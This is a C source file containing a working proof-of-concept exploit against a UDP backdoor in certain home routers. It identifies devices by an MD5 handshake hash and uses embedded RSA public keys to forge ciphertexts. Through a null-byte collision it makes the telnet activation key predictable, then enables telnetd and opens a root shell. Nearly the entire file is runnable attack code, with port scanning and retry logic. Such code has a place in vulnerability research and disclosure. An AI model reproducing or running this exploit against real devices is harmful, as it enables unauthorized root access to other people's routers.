#include <stdio.h>
#include <sys/time.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <openssl/bn.h>
#include <openssl/md5.h>
#include <openssl/rsa.h>

#define SCAN_DELAY  300000
#define STAGE_DELAY 80000
#define DELAY_INCREMENT 2000
#define DELAY_DECREMENT 1000
#define BACKDOOR_PORT 21210
#define TELNET_PORT 23
#define PLAINTEXT_LENGTH 0x20
#define CIPHERTEXT_LENGTH 0x80
#define MAX_TRIES 2048

#define NO_FLAGS 0
#define WIPE() { memset(plaintext, 0, PLAINTEXT_LENGTH+1); memset(ciphertext, 0, CIPHERTEXT_LENGTH); }




void print_from(struct sockaddr_in *from) {
  char *ns;
  ns = inet_ntoa(from->sin_addr);
  fprintf(stdout, "[<] remote address %s:%d\n", ns, ntohs(from->sin_port) & 0xFFFF);
  return;
}

/////// Hexdump code

void fhexdump(FILE *fd, unsigned char *data, int len) {
  int i;
  for (i = 0; i < len; i++) {
    if (i % 16 == 0) {
      fprintf(fd, "\n");
    } else if (i % 8 == 0) {
      fprintf(fd, "  ");
    } else {
      fprintf(fd, " ");
    }
    fprintf(fd, "%02x", data[i]);
  }
  fprintf(fd, "\n\n");
}


void hexdump(unsigned char *data, int len) {
  fhexdump(stdout, data, len);
}


void bar(char ch) {
  int i;
  for (i = 0; i < 65; i++) {
    putc(ch, stdout);
  }
  putc('\n', stdout);
  return;
}


////// MD5 Code

int md5raw(unsigned char *out, const unsigned char *in, int len) {
  MD5_CTX c;
  MD5_Init(&c);
  MD5_Update(&c, in, len);
  MD5_Final(out, &c);
  return 0;
}

unsigned char *device_identifying_hash(const char *identifier) {
  unsigned char buffer[0x80];
  unsigned char *hash;
  hash = calloc(16, sizeof(char));
  memset(buffer, 0, 0x80);
  strcpy((char *) buffer, identifier);
  md5raw(hash, (const unsigned char *) buffer, 0x80);
  return hash;
}

////// RSA stuff

RSA *init_rsa(const char *public_n, const char *public_e) {
  BIGNUM *e;
  BIGNUM *n;
  RSA *rsa;
  rsa = RSA_new();
  n = BN_new();
  e = BN_new();
  BN_hex2bn(&n, public_n);
  BN_hex2bn(&e, public_e);
  rsa->e = e;
  rsa->n = n;
  return rsa;
}


int decrypt_with_pubkey(RSA *rsa, unsigned char *ciphertext, unsigned char *plaintext) {
  int sz;
  memset(plaintext, 0, PLAINTEXT_LENGTH);
  sz = RSA_size(rsa);
  //fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_decrypt(sz, ciphertext, plaintext, rsa, RSA_NO_PADDING);
}


int encrypt_with_pubkey(RSA *rsa, unsigned char *plaintext, unsigned char *ciphertext) {
  int sz;
  memset(ciphertext,0,CIPHERTEXT_LENGTH);
  sz = RSA_size(rsa);
  fprintf(stderr, "[-] RSA_size(rsa) = %d\n", sz);
  return RSA_public_encrypt(sz, plaintext, ciphertext, rsa, RSA_NO_PADDING); 
}



//// Network code

int communicate(char *ip_addr, 
    unsigned int port,
    unsigned char *msg, 
    unsigned int msg_len, 
    unsigned char *resp,
    unsigned int resp_len,
    long int recv_timeout) {


  int sockfd;
  size_t n;
  unsigned int len;
  //struct timeval tv;
  //tv.tv_sec =  recv_timeout / 1000000;
  //tv.tv_usec = recv_timeout % 1000000;

  n = 0;

  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));
  struct sockaddr_in server_resp_addr;
  memset(&server_resp_addr, 0, sizeof(struct sockaddr_in));

  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  


  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  
/*
int envelope_len = 0x80;
  unsigned char envelope[envelope_len];
  memset(envelope, 0, envelope_len);
  memcpy(envelope, msg, msg_len);
  */
  printf("[>] Sending 0x%x-byte message to %s on UDP port %d:\n", msg_len, ip_addr, port);
  hexdump(msg, msg_len);

  sendto(sockfd, (const char*) msg, msg_len, NO_FLAGS, 
      (const struct sockaddr *) &server_addr,
      sizeof(server_addr));

  printf("[>] Message sent.\n");


  if (resp_len > 0) {
    printf("[-] Expecting %d bytes in reply...\n", resp_len);
    //printf("[-] Setting socket timeout to %lds + %ldus\n", tv.tv_sec, tv.tv_usec);
    //setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    
    // Here we might want to read from the socket in chunks, without
    // blocking indefinitely...
    //
    n = recvfrom(sockfd, resp, resp_len, NO_FLAGS,
        (struct sockaddr *) &server_resp_addr, &len);

    print_from(&server_resp_addr);

    printf("\n[<] Received %ld bytes in reply:\n", n);
    hexdump(resp, n);
  }

  close(sockfd);

  return n;
}



int check_tcp_port(char *ip_addr, int port) {
  int sockfd;

  printf("[>] Checking TCP port %d on %s...\n", port, ip_addr);

  /* KLUDGE 
  char *telnet_command;
  telnet_command = malloc(0x80 * sizeof(char));
  sprintf(telnet_command, "telnet %s %d", ip_addr, port);
  printf("[>] Using system(\"%s\") as a kludge...\n", telnet_command);
  return !system(telnet_command);

  */

  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if(sockfd == -1){
    puts("[x] Failed to create socket. Fatal.");
    exit(1);
  }
  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  if (connect(sockfd,(struct sockaddr *) &server_addr,sizeof(server_addr)) < 0) {
    printf("[x] TCP port %d on %s is closed.\n", port, ip_addr);
    close(sockfd);
    return 0;
  } else {
    printf("[!] TCP port %d on %s is open.\n", port, ip_addr);
    close(sockfd);
    return 1;
  }
}


struct DeviceList {
  unsigned char *hash;
  const char *identifier;
  const char *public_n;
  const char *public_e;
  struct DeviceList *next;
};


struct DeviceList * add_entry_to_device_list(struct DeviceList *DL, 
    const char *identifier,
    const char *public_n,
    const char *public_e) {
  struct DeviceList * node;
  node = DL;

  unsigned char buffer[0x80];
  memset(buffer, 0, 0x80);
  
  if (node->identifier != NULL) {
    // first, find the end of the list:
    for (node = DL; node->next != NULL; node = node->next) {
      if (!strcmp(node->identifier, identifier)) {
        printf("[-] %s already appears in device list.\n", identifier);
        return node;
      }
    }

    // The empty cell is now at node->next
    node->next = malloc(sizeof(struct DeviceList));
    memset(node->next, 0, sizeof(struct DeviceList));
    node = node->next;
  }

  node->identifier = strdup(identifier);
  node->hash = device_identifying_hash(identifier);
  node->public_n = strdup(public_n);
  node->public_e = public_e;

  printf("[+] Added device to list:\n"
      "    - identifier: %s\n"
      "    - public_n: 0x%s\n"
      "    - public_e 0x%s\n"
      "    - hash:\n",
      identifier,
      public_n,
      public_e);
  hexdump(node->hash, 16);

  return node;
}


struct DeviceList * lookup_device_hash(struct DeviceList *DL, unsigned char *hash) {
  struct DeviceList *node; 
  node = DL;  
  for (node = DL; node != NULL; node = node->next) {
    if (!memcmp(hash, node->hash, 16)) {
      printf("[+] Found matching hash. Identifier: %s\n", node->identifier);
      return node;
    }
  }
  return NULL;
}

struct DeviceList * lookup_device_name(struct DeviceList *DL, char *name) {
  struct DeviceList *node;
  for (node = DL; node != NULL; node = node->next) {
    if (!strcmp(name, node->identifier)) {
      printf("[+] Found matching name: %s\n", node->identifier);
      return node;
    }
  }
  return NULL;
}


#define FALLBACK "the old key"

struct DeviceList * init_device_list() {
  struct DeviceList *DL;
  DL = (struct DeviceList *) malloc(sizeof(struct DeviceList));
  memset(DL, 0, sizeof(struct DeviceList));

  add_entry_to_device_list(DL,
    "K2_COSTDOWN__VER_3.0",
    "E541A631680C453DF31591A6E29382BC5EAC969DCFDBBCEA64CB49CBE36578845C507BF5E7A6BCD7"
    "24AFA7063CA754826E8D13DBA18A2359EB54B5BE3368158824EA316A495DDC3059C478B41ABF6B38"
    "8451D38F3C6650CDB4590C1208B91F688D0393241898C1F05A6D500C7066298C6BA2EF310F6DB2E7"
    "AF52829E9F858691",
    "010001");

  add_entry_to_device_list(DL,
    "K3C_INTELALL_VER_3.0",
    "E7FFD1A1BB9834966763D1175CFBF1BA2DF53A004B62977E5B985DFFD6D43785E5BCA088A6417BAF"
    "070BCE199B043C24B03BCEB970D7E47EEBA7F59D2BE4764DD8F06DB8E0E2945C912F52CB31C56C83"
    "49B689198C4A0D88FD029CCECDDFF9C1491FFB7893C11FAD69987DBA15FF11C7F1D570963FA3825B"
    "6AE92815388B3E03",
    "010001");

  add_entry_to_device_list(DL,
    FALLBACK,
    "CC232B9BB06C49EA1BDD0DE1EF9926872B3B16694AC677C8C581E1B4F59128912CBB92EB363990FA"
    "E43569778B58FA170FB1EBF3D1E88B7F6BA3DC47E59CF5F3C3064F62E504A12C5240FB85BE727316"
    "C10EFF23CB2DCE973376D0CB6158C72F6529A9012786000D820443CA44F9F445ED4ED0344AC2B1F6"
    "CC124D9ED309A519",
    "010001");


  return DL;
}



struct DeviceList * probe_udp_port(struct DeviceList *DL, 
    char *ip_addr, 
    int port, 
    unsigned char *token, 
    int token_len) {
  int n;
  unsigned int len;
  unsigned char buffer[0x80];
  struct DeviceList *device_info;

  memset(buffer, 0, 0x80);
  
  int sockfd, res;
  struct sockaddr_in server_addr;
  memset(&server_addr,0,sizeof(struct sockaddr_in));

  sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

  // Set address information
  server_addr.sin_family = AF_INET;
  server_addr.sin_addr.s_addr = inet_addr(ip_addr);
  server_addr.sin_port = htons(port);
  
  printf("[-] Probing UDP port %d on %s...\n", port, ip_addr);
  //hexdump(token, token_len);

  res = sendto(sockfd, (const char*) token, token_len, NO_FLAGS, 
      (const struct sockaddr *) &server_addr,
      sizeof(server_addr));

  usleep(SCAN_DELAY);

  if (res < 0) {
    printf("[x] sendto() failed.\n");
    return NULL;
  }

  n = recvfrom(sockfd, buffer, 1, MSG_PEEK|MSG_DONTWAIT,
      (struct sockaddr *) &server_addr,
      &len);

  if (n < 1) {
    printf("[-] no response on port %d\n", port);
    return NULL;
  }

  printf("[+] response incoming...\n");

  memset(buffer, 0, 0x80);

  n = recvfrom(sockfd, buffer, 16, MSG_WAITALL,
      (struct sockaddr *) &server_addr,
      &len);
  printf("[+] Received %d bytes in reply to token on UDP port %d:\n", n, port);
  hexdump(buffer, n);
  if (n == 16) {
    device_info = lookup_device_hash(DL, buffer);
    return device_info;
  }

  close(sockfd);

  return NULL; 
}

//// Exploit

#define PHONY_CIPHERTEXT_LENGTH 0x80


// What if we add this constraint: the phony ciphertext should begin
// with the ephemeral password?
// That way it won't really matter if we fall out of sync!
void random_buffer(unsigned char *buf, int len) {
  FILE *urandom;
  urandom = fopen("/dev/urandom", "rb");
  fread(buf, sizeof(unsigned char), len, urandom);
  fclose(urandom);
  return;
}


#define NULL_COLLISION 1
#define OLD_WAY 2

void find_phony_ciphertext(RSA *rsa,
  unsigned char *phony_ciphertext,
  unsigned char *phony_plaintext,
  unsigned char *prefix,
  int prefix_len,
  int mode
  ) {

  memset(phony_ciphertext, 0, CIPHERTEXT_LENGTH);
  memset(phony_plaintext, 0, CIPHERTEXT_LENGTH);
  int plaintext_length;
  int tries = 0;
  do {
    tries++;

    random_buffer(phony_ciphertext, CIPHERTEXT_LENGTH);
    phony_ciphertext[0] || (phony_ciphertext[0] |= 1);
    if (prefix_len) {
      memcpy(phony_ciphertext, prefix, prefix_len);
    }

    if (rsa == NULL) {
      // If we don't have the public key, we can still try just
      // throwing random buffers at the target and see what
      // sticks.
      printf("[-] We don't have a matching public key for this target\n"
          "    so we'll just throw random buffers at it and see what sticks.\n"
          "    returning:\n");
      hexdump(phony_ciphertext, CIPHERTEXT_LENGTH);
      return;
    }
    plaintext_length = decrypt_with_pubkey(rsa, phony_ciphertext, phony_plaintext); 
    // If the first character of phony_plaintext is printable, then
    // there is a chance it will collide with the first character of
    // the secret, random string. Since the phony_plaintext will be
    // XORed with the random string, this will produce a null byte at
    // offset 0. And THIS will cause the string concatenation
    // operation that's used to produce the telnet activation keys
    // to append an EMPTY STRING to the salt/suffix. And this will
    // make the MD5 hash of the secret predictable.
    int len_as_str = strlen((char *) phony_plaintext);
    if (mode == NULL_COLLISION && (plaintext_length < 0x101) && 
        (0x21 <= phony_plaintext[0]) && 
        (phony_plaintext[0] < 0x7f) &&
        (len_as_str < plaintext_length)) {
      printf("[!] Found valid Stage II payload in %d attempts:\n", tries);
      hexdump(phony_ciphertext, CIPHERTEXT_LENGTH);
      printf("[=] Decrypts to (%d bytes, strlen %d):\n", plaintext_length, len_as_str);
      hexdump(phony_plaintext, plaintext_length);
      return;
    } else if (mode == OLD_WAY && (len_as_str < plaintext_length)) {
      printf("[!] Found valid phony ciphertext after %d attempts:\n", tries);
      printf("[=] Decrypts to (%d bytes, strlen %d):\n", plaintext_length, len_as_str);
      hexdump(phony_plaintext, plaintext_length);
    }
  } while (1);
}


void status(char *stage, int on_try, int tries, int stage_delay, float ratio, char *modetext) {

    bar('=');
    printf("[*] ENTERING STAGE %s (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", 
        stage,
        on_try, tries,
        stage_delay,
        ratio,
        modetext);
    bar('=');
}

int main(int argc, char **argv) {
  unsigned char ciphertext[CIPHERTEXT_LENGTH];
  unsigned char plaintext[PLAINTEXT_LENGTH+1];
  RSA *rsa;
  rsa = NULL;
  WIPE();

  if (argc == 1) {
    printf("[?] Usage: %s <ip addr>\n", argv[0]);
    printf("    Set environment variable BACKDOOR_LEGACY for legacy mode.\n");
    printf("    Set environment variable BACKDOOR_SALT to PERM or TEMP (default), to\n"
           "    enable telnetd on a PERManent or TEMPorary basis.\n");
    exit(1);
  }
  
  /** The exploit **/

  char *ip_addr = argv[1]; 
  const char *handshake_token = "ABCDEF1234";
  unsigned char phony_ciphertext[CIPHERTEXT_LENGTH];
  unsigned char phony_plaintext[CIPHERTEXT_LENGTH];
  unsigned char backdoor_key[16];
  char magic_salt[6]; // = "+TEMP";
  char *salt_var;
  salt_var = getenv("BACKDOOR_SALT");
  if (salt_var == NULL) {
    salt_var = "TEMP";
  }
  snprintf(magic_salt, 6, "%s", salt_var);
  printf("[+] Using magic salt \"%s\"\n", magic_salt);
  int temp_mode;
  temp_mode = strcmp(magic_salt, "TEMP") == 0;
  printf("[+] temp_mode = %d\n", temp_mode);
  int legacy_mode;
  int no_secret_mode = 0;
  legacy_mode = getenv("BACKDOOR_LEGACY") != NULL;
  no_secret_mode = getenv("BACKDOOR_NO_SECRET") != NULL;
  char *modetext;
  if (legacy_mode) {
    modetext = "LEGACY MODE";
  } else if (no_secret_mode) {
    modetext = "NO SECRET MODE";
  } else {
    modetext = "ULTIMATE MODE";
  }
  unsigned char buffer[CIPHERTEXT_LENGTH];
  int tries = MAX_TRIES;
  char *telnet_command;
  struct timeval timecheck;
  long int start;
  long int elapsed;
  int number_of_ports_to_scan;
  int i;
  int *ports_to_scan;
  int backdoor_port;

  int stage_delay = STAGE_DELAY;
  struct DeviceList *device_list;
  struct DeviceList *device_info;
  device_list = init_device_list();

  if ((argc < 3) || strcmp(argv[2], "scan")) {
    number_of_ports_to_scan = 1;
    ports_to_scan = NULL;
    if (argc < 3) {
      backdoor_port = 21210;
    } else {
      backdoor_port = atoi(argv[2]);
    }
  } else {
    number_of_ports_to_scan = argc - 3;
    ports_to_scan = calloc(number_of_ports_to_scan, sizeof(int));
    int p = 0;
    for (i = 3; i < argc; i++) {
      // check to see if a range is given
      char *upper, *lower;
      int upper_port, lower_port;
      lower = strtok(argv[i], "-");
      upper = strtok(NULL, "-");
      lower_port = atoi(lower);
      if (upper != NULL) {
        printf("[+] Found range delimiter in %s\n", argv[i]);
        int *ports_to_scan_new;
        upper_port = atoi(upper);
        printf("[+] lower = %d, upper = %d\n", lower_port, upper_port);
        number_of_ports_to_scan += (upper_port - lower_port);
        ports_to_scan_new = calloc(number_of_ports_to_scan, sizeof(int));
        memcpy(ports_to_scan_new, ports_to_scan, p * sizeof(int));
        free(ports_to_scan);
        ports_to_scan = ports_to_scan_new;
        int P;
        for (P = lower_port; P <= upper_port; P++) {
          printf("[+] Adding port %d to scan list\n", P);
          ports_to_scan[p] = P;
          p++;
        }
      } else {
        printf("[+] Adding port %d to scan list\n", lower_port);
        ports_to_scan[p] = lower_port;
        p++;
      }
    }
  }


  char *telnet_port_str;
  telnet_port_str = getenv("BACKDOOR_TELNET_PORT");
  int telnet_port = telnet_port_str ? atoi(telnet_port_str) : 23;

  telnet_command = malloc(0x80 * sizeof(char));
  sprintf(telnet_command, "telnet %s %d", ip_addr, telnet_port);
  
  if (temp_mode && check_tcp_port(ip_addr, telnet_port)) {
    printf("[!] The back door is already open! Why not killall telnetd and try again?\n");
    system(telnet_command);
    printf("[*] Have a nice day.\n");
    exit(0);
  }

  gettimeofday(&timecheck, NULL);
  start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;

  //////////////////////////
  // Port scan
  // ////////////////////////
  if (ports_to_scan != NULL) {
    printf("[+] About to scan %d ports...\n", number_of_ports_to_scan);
    for (i = 0; i < number_of_ports_to_scan; i++) {
      backdoor_port = ports_to_scan[i];
      device_info = probe_udp_port(device_list, 
          ip_addr, backdoor_port, 
          (unsigned char *) handshake_token, 
          strlen((char *) handshake_token)); 
      if (device_info != NULL) {
        break;
      }
    }
  

    if (device_info == NULL) {
      printf("[x] Failed to solicit identifying handshake on the following ports:\n");
      for (i = 0; i < number_of_ports_to_scan; i++) {
        printf("    - %d\n", ports_to_scan[i]);
      }
      if (number_of_ports_to_scan > 1) {
        exit(1);
      } else {
        printf("[+] But you only specified one port, so we'll perservere with a null key.\n");
        rsa = NULL;
        goto STAGE_II;
      }
    } else {
      rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
      goto STAGE_II;
    }
  }


  int no_reply = 0;
  int got_reply = 0;
  float ratio = 1.0;

#define QUALITY_CONTROL(__com_res) { if ((__com_res) == -1) { \
  no_reply ++; \
  ratio = 100 * got_reply / (no_reply + got_reply); \
  printf("[x] No reply (received replies %d times out of %d (%.2f%%)).\n", got_reply, no_reply + got_reply, ratio); \
  stage_delay += DELAY_INCREMENT; \
  goto STAGE_I;  \
} else if (stage_delay > DELAY_DECREMENT) { \
  got_reply ++; \
  stage_delay -= DELAY_DECREMENT; \
} }

  /* something should be done here to reset the state machine */
  int on_try = 0;
  int com_res = 0;

  if (legacy_mode) {
    device_info = lookup_device_name(device_list, FALLBACK);
    printf("[+] Setting RSA key for legacy mode\n");
    rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
  }

// we only need to define this once, since it's constant
//
  int backdoor_key_len = 0x10;
  memset(backdoor_key, 0, backdoor_key_len);
  char unhashed_backdoor_key[0x10];
  snprintf(unhashed_backdoor_key, 0xf, "+%s", magic_salt);
  md5raw(backdoor_key, (unsigned char *) unhashed_backdoor_key, strlen(unhashed_backdoor_key));


  do {
    
    goto STAGE_I;

STAGE_I:
    on_try += 1;

    /* Test to see if the telnet port is open. */
    if (temp_mode && check_tcp_port(ip_addr, telnet_port)) {

      gettimeofday(&timecheck, NULL);
      elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;

      printf("[*] Backdoor lock picked in %ld msec with %d attempts.\n", elapsed, on_try);
      printf("[*] Please enjoy your root shell.\n");
      system(telnet_command);
      printf("[*] PoC complete. Have a nice day.\n");
      exit(0);
    } else {
      printf("[+] Not yet. %d tries remaining...\n", tries-on_try);
    }

    if (legacy_mode || no_secret_mode) {
      goto STAGE_II;
    }
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    status("I", on_try, tries, stage_delay, ratio, modetext);
    printf("[+] Sending handshake token: %s\n", handshake_token);
    printf("[-] Waiting for device identifying hash...\n");
    QUALITY_CONTROL(communicate(ip_addr, backdoor_port,
        (unsigned char *) handshake_token,
        strlen((char *) handshake_token),
        buffer,
        16,
        stage_delay));

    printf("[+] Received device identifying hash:\n");
    hexdump(buffer, 16);

    if (!legacy_mode) {
      if (device_info == NULL) {
        if ((device_info = lookup_device_hash(device_list, buffer))) {
          rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
        } else {
          legacy_mode = 1;
          device_info = lookup_device_name(device_list, FALLBACK);
          rsa = init_rsa((char *) device_info->public_n, device_info->public_e);
        }
      } else {
        // not strictly necessary, but I like to make sure everything's in order
        if (0 != memcmp(device_info->hash, buffer, 16)) {
          printf("[x] Discrepancy in device identifying hash. Expected:\n");
          hexdump(device_info->hash, 16);
          if (rsa != NULL) {
            exit(1);
          }
        } else {
          printf("[+] Device identifying hash matches MD5(\"%s\").\n", device_info->identifier);
        }
      }
    } else {
      printf("[!] Not checking hash (CHAOS MODE).\n");
    }
    goto STAGE_II;

STAGE_II:
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    bar('=');
    printf("[*] ENTERING STAGE II (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", on_try, tries,
        stage_delay,
        ratio,
        modetext);
    bar('=');
    memset(buffer, 0, CIPHERTEXT_LENGTH);
    find_phony_ciphertext(rsa, 
        phony_ciphertext,
        phony_plaintext,
        backdoor_key, 
        backdoor_key_len, 
        no_secret_mode ? OLD_WAY : NULL_COLLISION);  
    com_res = communicate(ip_addr, backdoor_port,
        phony_ciphertext,
        CIPHERTEXT_LENGTH,
        buffer,
        no_secret_mode ? 0 : 0x20,
        stage_delay);
    QUALITY_CONTROL(com_res);
    goto STAGE_III;

STAGE_III:
    usleep(stage_delay);
    memset(buffer, 0, 0x80);
    bar('=');
    printf("[*] ENTERING STAGE III (round %d/%d) (d: %d, rr: %.2f%%) IN %s\n", on_try, tries,
        stage_delay,
        ratio,
        modetext);
    bar('=');
    printf("[+] Sending MD5('+%s') and hoping for collision...\n",
        (char *) magic_salt);

    unsigned char msg[0x10];
    if (no_secret_mode) {
      char s[0x200];
      snprintf(s, 0x180, "%s+%s", (char *) phony_plaintext, magic_salt);
      md5raw(msg, (unsigned char *) s, strlen(s)); 
    } else {
      memcpy(msg, backdoor_key, 0x10);
    }

    com_res = communicate(ip_addr, backdoor_port,
        backdoor_key,
        backdoor_key_len,
        buffer,
        0,
        stage_delay);
    QUALITY_CONTROL(com_res);


    usleep(stage_delay);

  } while (tries - on_try > 0);
  
  return 0;
}

